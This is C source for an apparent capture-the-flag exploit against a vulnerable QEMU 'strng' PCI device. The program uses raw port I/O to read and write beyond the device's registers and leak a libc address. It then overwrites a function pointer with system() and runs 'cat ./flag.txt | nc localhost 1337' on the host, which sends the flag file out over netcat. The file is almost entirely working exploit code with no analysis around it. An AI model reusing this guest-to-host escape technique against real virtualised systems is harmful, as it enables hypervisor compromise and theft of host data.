#include <sys/io.h>
#include <assert.h>
#include <stdint.h>

static unsigned int pmio_base = 0xc050;

void pmio_write(unsigned int val, unsigned int addr)
{
    // Write 4 bytes at specific port addr.
    // This will be translated to direct assembly outl insn.
    outl(val, addr);
}

uint32_t pmio_read(unsigned int addr)
{
    // Read 4 byte at given port addr.
    return inl(addr);
}

void pmio_write_at_offset(unsigned int val, unsigned int offset)
{
    // Because the offset will be used like this:
    // saddr = strng->addr >> 2
    offset <<= 2;
    // If we write at offset 0, (at 0xc050 exactly).
    // We will be setting strng->addr = val;
    pmio_write(offset, pmio_base);
    // If we write at offset 4, (at 0xc054)
    // We will use the offset we set eariler and write a value.
    // saddr = strng->addr >> 2;
    // ...
    // strng->regs[saddr] = val;
    pmio_write(val, pmio_base + 0x4);
}

uint32_t pmio_read_at_offset(unsigned int offset)
{
    // Same for write at offset, we will set the offset.
    offset <<= 2;
    pmio_write(offset, pmio_base);
    return pmio_read(pmio_base + 0x4);
}

void trigger_rip()
{
    pmio_write(12, pmio_base);
    pmio_write('M', pmio_base+4);
}

int main()
{
    // Change our process I/O privilege level.
    assert(iopl(3) == 0);
    //pmio_write_at_offset(*(uint32_t*)"/bin/sh\x00", 2);


    uint32_t h2 = pmio_read_at_offset(65);
    uint32_t h1 = pmio_read_at_offset(66);
    uint64_t srand_leak = h1;
    srand_leak = (srand_leak << 32) | h2 ;
    printf("srand_leak = 0x%llx\n", srand_leak);
    uint64_t libc_base = srand_leak - 0x475f0;
    uint64_t system = libc_base + 0x522c0;
    uint64_t gadget = libc_base + 0x00000000000de2c4;
    //uint64_t binsh = libc_base + 0x1b45bd;

    pmio_write_at_offset(gadget & 0xffffffff, 69);
    pmio_write_at_offset(gadget >> 32, 70);


    char *ptr = "cat ./flag.txt | nc localhost 1337  ";
    uint32_t* p = (uint32_t*)ptr;

    pmio_write_at_offset(p[1], 2+8);
    pmio_write_at_offset('M', 3);

    pmio_write_at_offset(p[0], 2);

    int i = 2;
    while(i < strlen(ptr)/4)
    {
        pmio_write_at_offset(p[i], 2+i);
        i++;
    }

    pmio_write_at_offset(system & 0xffffffff, 69);
    pmio_write_at_offset(system >> 32, 70);

    getchar();
    trigger_rip();
    
}
